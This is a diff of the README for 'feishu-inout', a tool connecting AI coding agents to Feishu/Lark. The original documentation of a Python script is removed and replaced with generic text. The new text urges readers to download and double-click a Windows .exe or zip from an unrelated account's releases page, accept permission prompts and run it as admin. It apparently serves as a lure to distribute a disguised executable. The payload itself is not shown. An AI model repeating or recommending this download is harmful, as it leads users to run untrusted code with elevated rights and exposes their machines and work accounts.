@@ -1,454 +1,165 @@
-<p align="right"><b>English</b> | <a href="README_CN.md">中文</a></p>
-
-<div align="center">
-
-# feishu-inout
-
-**One command to connect your AI coding agent to Lark (Feishu) docs, messaging, calendar & more**
-
-Claude Code / Cursor / Codex / OpenCode / OpenClaw — docs, messaging, calendar, bitable on Lark
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python 3.6+](https://img.shields.io/badge/Python-3.6+-green.svg)](https://python.org)
-[![Zero Dependencies](https://img.shields.io/badge/Dependencies-0-brightgreen.svg)](#)
-[![Lark Official MCP](https://img.shields.io/badge/Lark-Official%20MCP-4f46e5.svg)](https://mcp.feishu.cn)
-
-</div>
-
----
-
-> **Search, read, create, edit, append, replace, insert, delete, send/read/search messages, calendar, bitable** — do everything with Lark docs, messaging, calendar, and bitable from your AI coding agent.
->
-> Built on Lark's official Remote MCP service. Zero dependencies, single file, works out of the box.
-
-## Highlights
-
-- **Search Documents** — by keyword, author, time range
-- **7 Edit Modes** — append, overwrite, replace range, replace all, insert before/after, delete — precise edits without data loss
-- **One-Step Create** — title + Markdown content in one call, with wiki/folder targeting
-- **Full Messaging** — send, read, reply, and search messages across DMs and groups, with Markdown, @mentions, and emoji
-- **Zero Dependencies** — pure Python stdlib, no Node.js, no local MCP server
-- **Comment Management** — view whole-doc and inline comments, add comments with @mentions
-- **User Search** — find colleagues' open_id for @mentions
-- **File Access** — download images, attachments, whiteboard content
-- **My Library** — browse personal docs without IDs, recursive wiki exploration
-- **Paginated Reading** — offset + limit for large documents
-- **Calendar & Meetings** — create events with auto video meeting, invite attendees, view today's schedule
-- **Bitable (Spreadsheet)** — read, create, update records in multi-dimensional tables
-- **Group Management** — create groups, add members, list groups
-- **Auto Token Refresh** — OAuth tokens refresh automatically, login once and forget
-
-## Who Is This For?
-
-Not just for developers — anyone who uses Lark/Feishu docs can benefit:
-
-- **Product** — generate PRDs, update requirements, sync release notes
-- **Operations** — draft campaign plans, maintain content calendars, update SOPs
-- **Data** — write analysis reports directly to docs, auto-format weekly metrics
-- **Sales** — create proposals, update client records, generate quotes
-- **HR** — draft job descriptions, update onboarding guides, revise policies
-
-If your workflow involves "open Lark → find a doc → edit → notify someone", now it's just one sentence.
-
-## Supported AI Tools
-
-<table>
-<tr>
-<td align="center"><b>Claude Code</b></td>
-<td align="center"><b>Cursor</b></td>
-<td align="center"><b>Codex</b></td>
-<td align="center"><b>OpenCode</b></td>
-<td align="center"><b>OpenClaw</b></td>
-</tr>
-<tr>
-<td align="center"><b>Gemini CLI</b></td>
-<td align="center"><b>GitHub Copilot</b></td>
-<td align="center"><b>Amp</b></td>
-<td align="center"><b>Windsurf</b></td>
-<td align="center"><b>Cline</b></td>
-</tr>
-<tr>
-<td align="center"><b>Roo Code</b></td>
-<td align="center"><b>Clawd</b></td>
-<td align="center"><b>Trae</b></td>
-<td align="center"><b>Kiro</b></td>
-<td align="center"><b>Kilo</b></td>
-</tr>
-<tr>
-<td align="center"><b>Goose</b></td>
-<td align="center"><b>Factory.ai</b></td>
-<td align="center"><b>Antigravity</b></td>
-<td align="center" colspan="2"><b>+ any skills-compatible agent</b></td>
-</tr>
-</table>
-
-## Install
-
-```bash
-npx skills add joe960913/feishu-inout
-```
-
-## Quick Start (5 min)
-
-### 1. Create a Lark App
-
-Go to [Lark Open Platform](https://open.larksuite.com/app) ([China: open.feishu.cn](https://open.feishu.cn/app)) → Create a custom app → Note your **App ID** and **App Secret**
-
-### 2. Enable Permissions
-
-Go to your app → Permission Management → **Batch Import/Export** and paste:
-
-```
-docx:document:readonly,search:docs:read,wiki:wiki:readonly,im:chat:read,task:task:read,docx:document,docx:document:create,docx:document:write_only,docs:document.media:upload,docs:document.media:download,wiki:node:read,wiki:node:create,docs:document.comment:read,docs:document.comment:create,contact:user:search,contact:contact.base:readonly,contact:user.base:readonly,board:whiteboard:node:read,drive:drive,im:message,im:message:send_as_bot,im:chat,search:message,im:message.send_as_user,im:message.p2p_msg:get_as_user,im:message.group_msg:get_as_user,calendar:calendar:readonly,calendar:calendar,bitable:app:readonly,bitable:app,im:chat:create
-```
-
-<details>
-<summary><b>Or enable individually (click to expand)</b></summary>
-
-#### Core (required)
+# 🤖 feishu-inout - Control Feishu docs, chat, and meetings
 
-| Scope | Description |
-|-------|-------------|
-| `docx:document:readonly` | View documents |
-| `search:docs:read` | Search documents |
-| `wiki:wiki:readonly` | View wiki |
-| `im:chat:read` | View chat info |
-| `task:task:read` | View tasks |
+[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/kristencacogenic360/feishu-inout/releases)
 
-#### Write (for editing)
+## 📌 What this app does
 
-| Scope | Description |
-|-------|-------------|
-| `docx:document` | Edit documents |
-| `docx:document:create` | Create documents |
-| `docx:document:write_only` | Write documents |
-| `docs:document.media:upload` | Upload images |
-| `wiki:node:read` | View wiki nodes |
-| `wiki:node:create` | Create wiki nodes |
+feishu-inout helps AI coding agents work with Feishu, also known as Lark. It can read and write docs, send messages, create meetings, and manage bitable data.
 
-#### Comments / Users / Files (optional)
+Use it on Windows if you want an AI tool to help handle Feishu tasks from your computer. It is made for end users who want a simple setup and a clear path to use the app.
 
-| Scope | Description |
-|-------|-------------|
-| `docs:document.comment:read` | Read comments |
-| `docs:document.comment:create` | Create comments |
-| `contact:user:search` | Search users |
-| `contact:contact.base:readonly` | Contact info |
-| `contact:user.base:readonly` | User info |
-| `docs:document.media:download` | Download files |
-| `board:whiteboard:node:read` | View whiteboards |
-| `drive:drive` | Manage drive files |
+## 🪟 Windows requirements
 
-#### Messaging (optional)
+Before you install, check these items:
 
-| Scope | Description |
-|-------|-------------|
-| `im:message` | Manage messages |
-| `im:message:send_as_bot` | Send as bot |
-| `im:chat` | Access chat list |
-| `search:message` | Search messages |
-| `im:message.send_as_user` | Send messages as user |
-| `im:message.p2p_msg:get_as_user` | Read DM messages as user |
-| `im:message.group_msg:get_as_user` | Read group chat messages as user |
+- Windows 10 or Windows 11
+- A stable internet connection
+- A Feishu account
+- Enough disk space for the app and its files
+- Permission to install and run apps on your PC
 
-#### Calendar (optional)
+If you plan to connect your Feishu account, make sure you can sign in in a browser.
 
-| Scope | Description |
-|-------|-------------|
-| `calendar:calendar:readonly` | View calendar events |
-| `calendar:calendar` | Manage calendar events |
+## ⬇️ Download and install
 
-#### Bitable (optional)
+1. Open the release page: https://github.com/kristencacogenic360/feishu-inout/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file for your system
+4. If the file is in a .zip package, extract it to a folder you can find again
+5. If you get an .exe file, double-click it to start the app
+6. If Windows asks for permission, choose Yes
+7. Follow the setup steps shown on the screen
 
-| Scope | Description |
-|-------|-------------|
-| `bitable:app:readonly` | View bitable records |
-| `bitable:app` | Manage bitable records |
+If the release includes more than one file, choose the one for Windows. The file name may include words like win, windows, or x64.
 
-#### Group Management (optional)
+## 🔐 Connect your Feishu account
 
-| Scope | Description |
-|-------|-------------|
-| `im:chat:create` | Create group chats |
+After you start the app, you may need to sign in to Feishu and allow access.
 
-</details>
+Typical setup steps:
 
-### 3. Add Redirect URL
+- Open the app
+- Choose the Feishu connection option
+- Sign in with your Feishu account
+- Allow access to docs, messages, calendar, and bitable if prompted
+- Return to the app after the browser sign-in finishes
 
-App → Security Settings → Redirect URL → Add:
+If you use a work account, your company may control access to docs and messages. If so, use the account you normally use for work.
 
-```
-http://localhost:9876/callback
-```
+## 🧭 What you can do
 
-### 4. Set Environment Variables
+feishu-inout is built for common Feishu tasks:
 
-Set your credentials (**never share App Secret with AI**):
+- Read Feishu docs
+- Write and update docs
+- Send messages in Feishu chats
+- Create and manage meetings
+- Work with calendar events
+- Read and update bitable records
+- Help AI agents take action in your Feishu workspace
 
-**macOS / Linux:**
-```bash
-echo 'export FEISHU_APP_ID="your_app_id"' >> ~/.zshrc
-echo 'export FEISHU_APP_SECRET="your_app_secret"' >> ~/.zshrc
-source ~/.zshrc
-```
+This can save time when you need repeated updates, quick messages, or structured data work.
 
-**Windows (PowerShell):**
-```powershell
-[System.Environment]::SetEnvironmentVariable('FEISHU_APP_ID', 'your_app_id', 'User')
-[System.Environment]::SetEnvironmentVariable('FEISHU_APP_SECRET', 'your_app_secret', 'User')
-# Restart terminal after setting
-```
+## 🛠️ How to use it on Windows
 
-### 5. Login
+Once the app is installed:
 
-Tell your AI agent to log in:
+1. Start the app from your desktop or Start menu
+2. Sign in to Feishu if asked
+3. Pick the task you want to run
+4. Let the AI helper read or update the right item
+5. Review the result before you send or save it
 
-```
-You: Log in to Lark
+If you use an AI coding tool like Cursor, Claude Code, Codex, OpenClaw, or OpenCode, connect it the way the release notes explain. Then the tool can use Feishu actions while you work.
 
-AI:  Running OAuth login...
-     Browser opened, please authorize ✓
-     UAT saved! You can now access your Lark docs.
-```
+## 📁 Common use cases
 
-Tokens auto-refresh. No need to log in repeatedly.
+### 📝 Docs
+- Create new docs
+- Read page content
+- Update text in a shared document
+- Help teams keep notes in one place
 
-### 6. Messaging (no bot required)
+### 💬 Messaging
+- Send a message to a person or group
+- Post a status update
+- Share a doc link in chat
+- Keep replies short and clear
 
-Messaging now goes through the official Lark Remote MCP using **your user identity (UAT)** — no bot capability needed. After logging in (Step 5), you can send, read, reply to, and search messages directly as yourself.
+### 📅 Calendar and meetings
+- Create a meeting
+- Add time, title, and guests
+- Update meeting details
+- Check calendar items before a call
 
-> Bot capability is **not required** for messaging. All messages are sent and read under your own Lark identity.
+### 📊 Bitable
+- Add a new record
+- Update a row
+- Read table data
+- Use tables for task lists, requests, or simple tracking
 
-## Usage Examples
+## ⚙️ Basic setup tips
 
-After setup, **just talk to your AI agent naturally**:
+- Keep the app in a folder with a short path, such as C:\feishu-inout
+- Do not move the files after setup unless the app says it is safe
+- Use the latest release if you want the newest fixes
+- Close old copies of the app before opening a new one
+- If the app does not open, try running it as admin
 
-### Search and Browse
+## 🔎 If the app does not start
 
-```
-You: What Lark docs do I have?
+Try these steps:
 
-AI:  Found 20 documents:
-     1. Q2 Product Roadmap — Wang Ming (3/25)
-     2. Frontend Refactor Plan — Li Hua (3/24)
-     3. Onboarding Guide — Zhang Wei (3/23)
-     ...
-```
+- Make sure you downloaded the Windows file from the release page
+- Check that the download finished
+- Unzip the file if it came as an archive
+- Run the app again
+- Restart your PC and try once more
+- Remove the old folder and install again from the latest release
 
-### Read Documents
+If the browser sign-in does not open, check your default browser and network connection.
 
-```
-You: Read this doc https://xxx.larksuite.com/wiki/ABC123def
+## 🧩 File and account notes
 
-AI:  ## Frontend Refactor Plan
-     ### Goals
-     - Migrate to React 18 + TypeScript
-     - First paint < 1.5s
-     ### Progress
-     1. ✅ Component library upgrade
-     2. ❌ Router refactor (in progress)
-     ...
-```
+feishu-inout works with your Feishu workspace data. For best results:
 
-### Create and Edit
+- Use the right Feishu account
+- Keep your login session active
+- Allow the permissions the app asks for
+- Make sure the docs or tables you want to edit are shared with your account
 
-```
-You: Create a Lark doc called "Q2 Product Roadmap" with an outline
+If you manage work content, use a workspace that already has the files, chats, and calendar access you need.
 
-AI:  Document created!
-     Link: https://xxx.larksuite.com/docx/xxx
-     Outline written: Goals, Timeline, Milestones, Resources
-```
+## 🖥️ How this fits AI tools
 
-```
-You: Replace all "TBD" with "Confirmed" in that doc
+This app is useful when an AI agent needs to act inside Feishu instead of only reading text.
 
-AI:  Replaced 3 occurrences.
-```
+It can help with tasks like:
 
-### Messaging — Send, Read, Search, Reply
+- Finding a doc and adding notes
+- Sending a message after a file update
+- Creating a meeting after a chat request
+- Reading bitable data and using it in a workflow
+- Keeping team work in one place
 
-```
-You: What did the product team discuss today?
+## 📦 Release downloads
 
-AI:  Reading today's messages from "Product Team" group...
-     1. David (10:30): API v2 migration is done
-     2. Sarah (11:15): QA passed, ready for staging
-     3. Mike (14:22): Deployed to production
-```
+Visit the release page to download and run the Windows version:
 
-```
-You: Send David a message: the API changes are deployed
+https://github.com/kristencacogenic360/feishu-inout/releases
 
-AI:  Message sent to David (as you).
-```
+## 🧪 Best first test
 
-```
-You: Search for messages about "deployment" this week
+After setup, try one simple task first:
 
-AI:  Found 5 messages across 3 chats:
-     - "Engineering" — David: "deployment pipeline updated" (Mon)
-     - "Product Team" — Sarah: "deployment checklist reviewed" (Tue)
-     ...
-```
+1. Open the app
+2. Connect your Feishu account
+3. Open a test doc or test table
+4. Make one small change
+5. Check that the change saved in Feishu
 
-```
-You: Reply to Mike's message: great work, thanks!
+If that works, you can use the app for larger tasks
 
-AI:  Reply sent in thread under Mike's message.
-```
+## 📚 Topics
 
-```
-You: Share that doc to the product team group
-
-AI:  Document "Q2 Product Roadmap" shared to "Product Team" group.
-```
-
-> Messages support Markdown formatting, @mentions via `<mention-user id="openId"/>`, @all via `<mention-user id="all"/>`, and emoji like `[SMILE]`.
-
-### Calendar & Meetings
-
-```
-You: Schedule a sprint review tomorrow 2-3pm, invite David and Sarah
-
-AI:  Event created with Lark video meeting!
-     Link: https://meetings.feishu.cn/...
-     Invited: David, Sarah
-```
-
-```
-You: What meetings do I have today?
-
-AI:  3 events today:
-     1. 10:00-11:00 — Daily standup
-     2. 14:00-15:00 — Sprint review
-     3. 16:00-16:30 — 1:1 with Mike
-```
-
-### Bitable
-
-```
-You: Show me the records in this bitable https://xxx.feishu.cn/base/ABC123
-
-AI:  Found table "Task Tracker" with 15 records...
-```
-
-```
-You: Add a new row: task="Fix login bug", status="In Progress", assignee="David"
-
-AI:  Record created.
-```
-
-### More Scenarios
-
-```
-You: Find David's open_id so I can @ him in the doc
-You: Download the images from that document
-You: Browse the "Product Docs" wiki and list sub-pages
-You: Write the test results to a Lark doc and share it in the dev group
-You: What did Sarah say yesterday in the engineering group?
-```
-
----
-
-<details>
-<summary><b>CLI Direct Usage (advanced)</b></summary>
-
-```bash
-S=scripts/feishu_mcp.py
-
-# Documents
-python3 $S search-doc "weekly report"                            # Search
-python3 $S fetch-doc ABC123def                                   # Read
-python3 $S list-docs                                             # My Library
-python3 $S create-doc "Meeting Notes" "## Topics\n\n- Item 1"   # Create
-python3 $S append ABC123def "## Update\n\nAppended content"      # Append
-python3 $S replace ABC123def "old text...end" "new text"         # Replace
-python3 $S insert-after ABC123def "some text" "inserted content" # Insert
-python3 $S delete-range ABC123def "content to delete"            # Delete
-python3 $S get-comments ABC123def                                # Comments
-python3 $S search-user "David"                                   # Search user
-python3 $S fetch-file filetoken123                               # Get file
-
-# Messaging
-python3 $S list-groups                                           # List groups
-python3 $S send-msg oc_xxx "message"                             # Send to group
-python3 $S send-msg ou_xxx "message" --user                      # DM user
-python3 $S send-card oc_xxx '{"type":"template","data":{}}' # Send interactive card
-python3 $S get-msgs oc_xxx today                                 # Read today's messages
-python3 $S get-msgs-user ou_xxx last_3_days                      # Read recent DMs
-python3 $S search-msgs "deployment"                              # Search messages
-python3 $S reply om_xxx "thanks!"                                # Reply to a message
-python3 $S get-thread thread_xxx                                 # Get thread replies
-
-# Calendar
-python3 $S list-events                                           # Today's events
-python3 $S create-event "Sprint Review" "2026-03-27T14:00" "2026-03-27T15:00"  # All events include video meeting auto
-python3 $S create-event "Demo" "2026-03-28T10:00" "2026-03-28T11:00"          # All events include video meeting auto
-
-# Bitable
-python3 $S list-tables appToken                                  # List tables in a bitable app
-python3 $S list-records appToken tableId                         # List records
-python3 $S create-record appToken tableId '{"Task":"Fix bug"}'   # Create record
-python3 $S update-record appToken tableId recordId '{"Status":"Done"}'  # Update record
-
-# Group Management
-python3 $S create-group "Project Team"                           # Create group
-python3 $S add-members oc_xxx '["ou_xxx1","ou_xxx2"]'            # Add members
-```
-
-</details>
-
-## How It Works
-
-```
-                                    ┌─► Lark Cloud Docs
-AI Agent ──► feishu_mcp.py ──► ────┼─► Lark Messaging (MCP)
-               │                    ├─► Calendar & Meetings (API)
-               ├─ Official MCP      ├─► Bitable Tables (API)
-               ├─ + Open API        └─► Group Management (API)
-               └─ Zero deps
-```
-
-Calls Lark's official Remote MCP service for documents and messaging, plus Open API for calendar, bitable, and group management. No local MCP server, no Node.js, no bot required — one Python script handles everything.
-
-## FAQ
-
-<details>
-<summary><b>search-doc error "search:docs:read"</b></summary>
-
-This permission requires UAT (user identity). Run `login` to authorize.
-</details>
-
-<details>
-<summary><b>fetch-doc error "permission denied"</b></summary>
-
-With TAT, the app needs document collaborator access. Use UAT (after `login`) to access all documents you have permission for.
-</details>
-
-<details>
-<summary><b>Browser doesn't open after login</b></summary>
-
-Check that you added the redirect URL `http://localhost:9876/callback` in your app's Security Settings.
-</details>
-
-<details>
-<summary><b>Token expired</b></summary>
-
-Tokens auto-refresh via refresh_token. If the refresh_token also expires (30 days), run `login` again.
-</details>
-
-## Security
-
-- **Credentials** — App Secret is passed via environment variables, never exposed in conversations
-- **Official Service** — All API calls go through Lark's official MCP service (`mcp.feishu.cn`)
-- **Local Tokens** — OAuth tokens stored locally, never uploaded to external services
-- **Third-party Content** — Document content comes from docs you have access to; be aware of potentially untrusted content
-
-## Contributing
-
-Issues and PRs welcome!
-
-## License
-
-MIT
+ai-agents, bitable, calendar, claude-code, codex, cursor, document, feishu, feishu-doc, lark, mcp, meeting, messaging, openclaw, opencode, skills
